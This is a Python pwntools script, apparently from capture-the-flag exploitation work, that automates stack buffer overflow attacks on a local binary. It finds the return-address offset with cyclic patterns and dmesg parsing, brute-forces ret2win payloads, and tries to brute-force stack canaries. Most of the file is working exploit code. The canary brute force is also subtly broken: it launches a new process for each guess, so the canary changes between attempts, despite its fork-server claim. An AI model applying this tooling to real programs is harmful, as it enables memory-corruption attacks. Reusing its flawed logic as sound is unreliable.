#!/usr/bin/env python3
"""
GDB/Pwntools 智能调试引擎 v2
实际可用的crash分析方法 — 不依赖GDB stdin
策略: process()+cyclic → dmesg || binary-search → offset
"""

import os, re, time, subprocess, tempfile, warnings
warnings.filterwarnings('ignore')  # suppress pwntools BytesWarning
from pwn import cyclic, cyclic_find, process, context, log, ELF, p64, u64, p32, u32

class GdbDebugger:
    """自动偏移/参数检测器"""
    
    def __init__(self, binary_path, verbose=True):
        self.binary_path = os.path.abspath(binary_path)
        self.verbose = verbose
        self.elf = ELF(binary_path, checksec=False)
        
    def log(self, msg, level='info'):
        if self.verbose:
            getattr(log, level)(f"  [gdb] {msg}")
    
    def find_offset(self, input_size=512):
        """
        方法1: cyclic pattern + dmesg RBP解析
        方法2: 二分搜索ret2win
        返回: offset (到return address的偏移)
        """
        self.log(f"Finding offset via cyclic pattern ({input_size} bytes)...")
        
        pattern = cyclic(input_size, n=4)  # 4-byte chunks for dmesg parsing
        
        # Step 1: 运行并crash
        try:
            p = process(self.binary_path)
            p.sendline(pattern)
            time.sleep(0.5)
            p.wait(timeout=2)
            if p.returncode == -11:
                self.log("SIGSEGV detected")
            p.close()
        except Exception as e:
            self.log(f"Process error: {e}")
            return None
        
        # Step 2: 从dmesg解析RBP找到偏移
        rbp_val = self._get_rbp_from_dmesg()
        if rbp_val:
            # RBP在64位下存的是8字节，用n=4的cyclic_find
            # 先试低4字节，再试高4字节
            packed = p64(rbp_val)
            offset_rbp = cyclic_find(packed[:4], n=4)
            if offset_rbp == -1:
                offset_rbp = cyclic_find(packed[4:], n=4)
            
            if offset_rbp != -1 and offset_rbp < input_size:
                # RBP在buffer之后8字节(saved rbp)
                # return address在RBP之后8字节
                ret_offset = offset_rbp + 8
                self.log(f"✅ offset={ret_offset} (dmesg RBP={hex(rbp_val)}, rbp_pos={offset_rbp})", 'success')
                return ret_offset
        
        # Step 3: dmesg失败 → 二分搜索
        self.log("dmesg failed, trying binary search...")
        return self._find_offset_binary(input_size)
    
    def _get_rbp_from_dmesg(self):
        """从dmesg解析最近crash的RBP值"""
        try:
            result = subprocess.run(
                ['dmesg'], capture_output=True, text=True, timeout=5
            )
            lines = result.stdout.split('\n')
            # 从后往前找最近的RBP行
            for line in reversed(lines):
                m = re.search(r'RBP:\s*([0-9a-f]+)', line, re.I)
                if m:
                    return int(m.group(1), 16)
        except:
            pass
        return None
    
    def _get_crash_from_dmesg(self):
        """从dmesg读取最近的crash RIP"""
        try:
            result = subprocess.run(
                ['dmesg'], capture_output=True, text=True, timeout=5
            )
            lines = result.stdout.split('\n')
            for line in reversed(lines):
                if 'segfault' in line.lower():
                    m = re.search(r'ip[:=]\s*(0x[0-9a-f]+)', line, re.I)
                    if m:
                        return int(m.group(1), 16)
        except:
            pass
        return None
    
    def _find_offset_binary(self, input_size):
        """二分搜索偏移量 (PIE aware)"""
        # PIE启用时相对地址无效，跳过
        if self.elf.pie:
            self.log("PIE enabled — binary search skipped (need PIE leak first)")
            return None
        
        # 尝试用ret2win目标地址测试
        win_addr = None
        if 'system' in self.elf.plt:
            win_addr = self.elf.plt['system']
        for name in ['win', 'ret2win', 'backdoor']:
            a = self.elf.symbols.get(name, 0)
            if a:
                win_addr = a
                break
        
        if not win_addr:
            return None
        
        MAX_ITER = 20
        self.log(f"Binary search with win={hex(win_addr)} (max {MAX_ITER} tries)...")
        consecutive_failures = 0
        for i, offset in enumerate(range(0x18, min(input_size, 0x200), 8)):
            if i >= MAX_ITER:
                self.log(f"Reached max iterations ({MAX_ITER}), giving up")
                return None
            # Early abort: if we can't start the process at all, binary search is useless
            if consecutive_failures >= 3:
                self.log("Process keeps failing — aborting binary search")
                return None
            payload = b'A' * offset + p64(win_addr)
            try:
                p = process(self.binary_path, timeout=5)
                consecutive_failures = 0
                p.sendline(payload)
                time.sleep(0.3)
                try:
                    resp = p.recv(timeout=2)
                    if b'flag' in resp.lower() or b'win' in resp.lower() or b'shell' in resp.lower():
                        self.log(f"Win triggered at offset={offset}")
                        p.close()
                        return offset
                except:
                    pass
                p.close()
            except Exception as e:
                consecutive_failures += 1
                self.log(f"Process error (fail #{consecutive_failures}): {e}")
                continue
        return None
    
    def detect_canary(self, base_offset):
        """通过crash模式检测canary (fork-server)"""
        if not self.elf.canary:
            self.log("No canary protection")
            return None
        
        self.log("Attempting canary detection...")
        canary = b'\x00'  # 第一个字节总是0
        
        for byte_pos in range(1, 8):
            for guess in range(256):
                payload = b'A' * base_offset
                payload += canary + bytes([guess])
                payload += b'B' * 40
                
                try:
                    p = process(self.binary_path)
                    p.sendline(payload)
                    time.sleep(0.2)
                    
                    exit_code = p.poll(block=True)
                    try:
                        output = p.recv(timeout=1)
                        if b'stack smashing' in output or b'__stack_chk' in output:
                            p.close()
                            continue
                    except:
                        pass
                    
                    if exit_code != -6:  # -6 = SIGABRT (canary fail)
                        canary += bytes([guess])
                        self.log(f"  canary[{byte_pos}] = {hex(guess)}")
                        p.close()
                        break
                    p.close()
                except:
                    pass
            
            if len(canary) <= byte_pos:
                self.log(f"Failed at byte {byte_pos}")
                return None
        
        val = u64(canary)
        self.log(f"✅ canary = {hex(val)}", 'success')
        return val
    
    def auto_debug_workflow(self):
        """全自动调试工作流"""
        self.log("=" * 40)
        self.log("Auto-Debug Workflow (v2)")
        self.log("=" * 40)
        
        info = {'offset': None, 'canary': None, 'has_canary': self.elf.canary}
        
        # Step 1: 找偏移
        info['offset'] = self.find_offset(512)
        
        # Step 2: 检测canary
        if info['has_canary'] and info['offset']:
            info['canary'] = self.detect_canary(info['offset'])
        
        self.log("\nDebug Results:")
        for k, v in info.items():
            if v:
                self.log(f"  {k}: {hex(v) if isinstance(v, int) else v}")
        
        return info
